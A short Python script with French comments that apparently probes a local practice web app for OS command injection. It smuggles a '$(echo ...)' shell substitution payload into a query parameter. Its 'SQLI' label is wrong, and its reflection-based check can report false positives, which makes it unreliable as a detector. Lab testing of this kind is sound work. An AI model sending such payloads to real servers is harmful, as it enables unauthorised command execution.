import requests
# SQLI 
# Fonction pour détecter l'injection de commande
def detect_command_injection(url):
    try:
        # Demande à l'utilisateur de saisir une commande système à exécuter
        command = input("Entrez une commande système à exécuter : ")

        # Concaténation de la commande dans l'URL (c'est juste un exemple, dans un contexte réel, cette information pourrait être obtenue via une entrée utilisateur, une API, etc.)
        payload = {"param": f"$(echo {command})"}
        response = requests.get(url, params=payload)

        # Vérifie si la réponse contient la sortie de la commande que nous avons exécutée
        if command in response.text:
            print("L'injection de commande a été détectée.")
        else:
            print("Aucune injection de commande détectée.")
    except requests.RequestException as e:
        print("Erreur lors de la requête :", e)
# Exemple d'utilisation
url = "http://localhost/Vulnerable-Web-Application/CommandExecution/CommandExec-1.php"  # Remplacez par l'URL de votre endpoint vulnérable
detect_command_injection(url)
